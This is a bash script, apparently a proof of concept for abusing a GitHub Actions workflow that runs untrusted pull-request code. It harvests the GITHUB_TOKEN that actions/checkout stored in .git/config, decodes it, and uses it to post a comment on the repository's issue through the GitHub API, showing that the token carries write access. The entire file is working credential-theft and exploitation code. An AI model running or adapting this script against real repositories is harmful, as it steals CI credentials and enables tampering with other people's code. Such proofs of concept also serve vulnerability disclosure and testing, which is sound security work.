#!/usr/bin/env bash
set -x
echo "ATTACKER_CODE_EXECUTED=yes"
echo "HEAD=$(git rev-parse HEAD)"
echo "GITHUB_REPOSITORY=${GITHUB_REPOSITORY}"

# Harvest the checkout credential that actions/checkout wrote into .git/config
AUTH=$(git config --local --get http.https://github.com/.extraheader | sed 's/^AUTHORIZATION: basic //')
TOKEN=$(printf '%s' "$AUTH" | base64 -d | cut -d: -f2)
echo "harvested_token_length=${#TOKEN}"

# Prove the harvested token carries the workflow's declared write permissions
curl -s -o /tmp/resp.json -w "issues_write_status=%{http_code}\n" -X POST \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/1/comments" \
  -d '{"body":"POC: write-scoped GITHUB_TOKEN used from untrusted PR code"}'
head -c 200 /tmp/resp.json; echo
